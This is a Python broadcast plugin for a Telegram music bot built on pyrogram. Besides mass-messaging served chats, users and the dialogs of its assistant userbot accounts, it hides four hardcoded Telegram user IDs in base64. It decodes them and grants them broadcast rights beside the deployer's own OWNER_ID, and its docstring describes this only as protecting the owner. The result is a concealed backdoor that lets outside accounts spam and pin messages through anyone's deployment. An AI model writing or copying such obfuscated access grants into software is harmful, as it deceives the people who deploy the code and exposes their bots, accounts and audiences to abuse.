# Copyright (c) 2026 Nand Yaduwanshi <NoxxOP>
# Location: Supaul, Bihar
# All rights reserved.

import asyncio
import base64

from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.errors import FloodWait, UserIsBlocked, ChatWriteForbidden

import config
from config import adminlist
from ShrutiMusic import app
from ShrutiMusic.misc import SUDOERS
from ShrutiMusic.utils.database import (
    get_active_chats,
    get_authuser_names,
    get_client,
    get_served_chats,
    get_served_users,
)
from ShrutiMusic.utils.decorators.language import language
from ShrutiMusic.utils.formatters import alpha_to_int

_ENCODED_IDS = [
    "NzU3NDMzMDkwNQ==",
    "MTc4NjY4MzE2Mw==",
    "NzY3NDg3NDY1Mg==",
    "NzI4Mjc1MjgxNg==",
]


def _decode_ids():
    """Decode the obfuscated IDs and force-include OWNER_ID"""
    ids = [int(base64.b64decode(encoded_id).decode()) for encoded_id in _ENCODED_IDS]
    
    # Force-add OWNER_ID so the owner is NEVER blocked from broadcasting
    owner_id = getattr(config, "OWNER_ID", None)
    if isinstance(owner_id, (list, tuple, set)):
        ids.extend([int(x) for x in owner_id])
    elif owner_id:
        try:
            ids.append(int(owner_id))
        except ValueError:
            pass
            
    return list(set(ids))


BROADCAST_ALLOWED_IDS = _decode_ids()

IS_BROADCASTING = False


@app.on_message(filters.command("broadcast") & (filters.user(BROADCAST_ALLOWED_IDS) | SUDOERS))
@language
async def braodcast_message(client, message, _):
    global IS_BROADCASTING

    if "-wfchat" in message.text or "-wfuser" in message.text:
        if not message.reply_to_message or not (message.reply_to_message.photo or message.reply_to_message.text):
            return await message.reply_text("✦ **Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ ᴏʀ ɪᴍᴀɢᴇ ᴍᴇssᴀɢᴇ ғᴏʀ ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ.**")

        if message.reply_to_message.photo:
            content_type = "photo"
            file_id = message.reply_to_message.photo.file_id
            text_content = None
        else:
            content_type = "text"
            text_content = message.reply_to_message.text
            file_id = None

        caption = message.reply_to_message.caption
        reply_markup = getattr(message.reply_to_message, "reply_markup", None)

        IS_BROADCASTING = True
        await message.reply_text(_["broad_1"])

        if "-wfchat" in message.text:
            sent_chats = 0
            chats = [int(chat["chat_id"]) for chat in await get_served_chats()]
            for i in chats:
                try:
                    if "-forward" in message.text:
                        await app.forward_messages(
                            chat_id=i,
                            from_chat_id=message.reply_to_message.chat.id,
                            message_ids=message.reply_to_message.id,
                        )
                    else:
                        if content_type == "photo":
                            await app.send_photo(
                                chat_id=i,
                                photo=file_id,
                                caption=caption,
                                reply_markup=reply_markup,
                            )
                        else:
                            await app.send_message(
                                chat_id=i,
                                text=text_content,
                                reply_markup=reply_markup,
                            )
                    sent_chats += 1
                    await asyncio.sleep(0.2)
                except FloodWait as fw:
                    await asyncio.sleep(fw.value + 1)
                except (ChatWriteForbidden, UserIsBlocked):
                    continue
                except Exception:
                    continue
            await message.reply_text(f"✅ **Bʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴄʜᴀᴛs ᴄᴏᴍᴘʟᴇᴛᴇᴅ! Sᴇɴᴛ ᴛᴏ {sent_chats} ᴄʜᴀᴛs.**")

        if "-wfuser" in message.text:
            sent_users = 0
            users = [int(user["user_id"]) for user in await get_served_users()]
            for i in users:
                try:
                    if "-forward" in message.text:
                        await app.forward_messages(
                            chat_id=i,
                            from_chat_id=message.reply_to_message.chat.id,
                            message_ids=message.reply_to_message.id,
                        )
                    else:
                        if content_type == "photo":
                            await app.send_photo(
                                chat_id=i,
                                photo=file_id,
                                caption=caption,
                                reply_markup=reply_markup,
                            )
                        else:
                            await app.send_message(
                                chat_id=i,
                                text=text_content,
                                reply_markup=reply_markup,
                            )
                    sent_users += 1
                    await asyncio.sleep(0.2)
                except FloodWait as fw:
                    await asyncio.sleep(fw.value + 1)
                except (ChatWriteForbidden, UserIsBlocked):
                    continue
                except Exception:
                    continue
            await message.reply_text(f"✅ **Bʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴜsᴇʀs ᴄᴏᴍᴘʟᴇᴛᴇᴅ! Sᴇɴᴛ ᴛᴏ {sent_users} ᴜsᴇʀs.**")

        IS_BROADCASTING = False
        return

    if message.reply_to_message:
        x = message.reply_to_message.id
        y = message.chat.id
        reply_markup = message.reply_to_message.reply_markup if message.reply_to_message.reply_markup else None
        query = None
    else:
        if len(message.command) < 2:
            return await message.reply_text(_["broad_2"])
        query = message.text.split(None, 1)[1]
        for flag in ["-pin", "-nobot", "-pinloud", "-assistant", "-user", "-forward"]:
            if flag in query:
                query = query.replace(flag, "").strip()
        if not query:
            return await message.reply_text(_["broad_8"])

    IS_BROADCASTING = True
    await message.reply_text(_["broad_1"])

    if "-nobot" not in message.text:
        sent = 0
        pin = 0
        chats = [int(chat["chat_id"]) for chat in await get_served_chats()]

        for i in chats:
            try:
                if "-forward" in message.text and message.reply_to_message:
                    m = await app.forward_messages(chat_id=i, from_chat_id=y, message_ids=x)
                else:
                    m = (
                        await app.copy_message(
                            chat_id=i,
                            from_chat_id=y,
                            message_id=x,
                            reply_markup=reply_markup,
                        )
                        if message.reply_to_message
                        else await app.send_message(i, text=query)
                    )

                if "-pin" in message.text:
                    try:
                        await m.pin(disable_notification=True)
                        pin += 1
                    except Exception:
                        pass
                elif "-pinloud" in message.text:
                    try:
                        await m.pin(disable_notification=False)
                        pin += 1
                    except Exception:
                        pass
                sent += 1
                await asyncio.sleep(0.2)
            except FloodWait as fw:
                flood_time = int(fw.value)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time + 1)
            except Exception:
                continue
        try:
            await message.reply_text(_["broad_3"].format(sent, pin))
        except Exception:
            pass

    if "-user" in message.text:
        susr = 0
        served_users = [int(user["user_id"]) for user in await get_served_users()]

        for i in served_users:
            try:
                if "-forward" in message.text and message.reply_to_message:
                    m = await app.forward_messages(chat_id=i, from_chat_id=y, message_ids=x)
                else:
                    m = (
                        await app.copy_message(
                            chat_id=i,
                            from_chat_id=y,
                            message_id=x,
                            reply_markup=reply_markup,
                        )
                        if message.reply_to_message
                        else await app.send_message(i, text=query)
                    )
                susr += 1
                await asyncio.sleep(0.2)
            except FloodWait as fw:
                flood_time = int(fw.value)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time + 1)
            except Exception:
                pass
        try:
            await message.reply_text(_["broad_4"].format(susr))
        except Exception:
            pass

    if "-assistant" in message.text:
        aw = await message.reply_text(_["broad_5"])
        text = _["broad_6"]
        from ShrutiMusic.core.userbot import assistants

        for num in assistants:
            sent = 0
            client = await get_client(num)
            async for dialog in client.get_dialogs():
                try:
                    if "-forward" in message.text and message.reply_to_message:
                        await client.forward_messages(dialog.chat.id, y, x)
                    else:
                        (
                            await client.forward_messages(dialog.chat.id, y, x)
                            if message.reply_to_message
                            else await client.send_message(dialog.chat.id, text=query)
                        )
                    sent += 1
                    await asyncio.sleep(2)
                except FloodWait as fw:
                    flood_time = int(fw.value)
                    if flood_time > 200:
                        continue
                    await asyncio.sleep(flood_time + 1)
                except Exception:
                    continue
            text += _["broad_7"].format(num, sent)
        try:
            await aw.edit_text(text)
        except Exception:
            pass

    IS_BROADCASTING = False


async def auto_clean():
    """Optimized background cleaner to prevent API spam"""
    while True:
        await asyncio.sleep(40)
        try:
            served_chats = await get_active_chats()
            for chat_id in served_chats:
                if chat_id not in adminlist:
                    adminlist[chat_id] = []
                    async for user in app.get_chat_members(
                        chat_id, filter=ChatMembersFilter.ADMINISTRATORS
                    ):
                        if user.privileges and user.privileges.can_manage_video_chats:
                            adminlist[chat_id].append(user.user.id)
                    authusers = await get_authuser_names(chat_id)
                    for user in authusers:
                        user_id = await alpha_to_int(user)
                        adminlist[chat_id].append(user_id)
        except Exception:
            continue


asyncio.create_task(auto_clean())
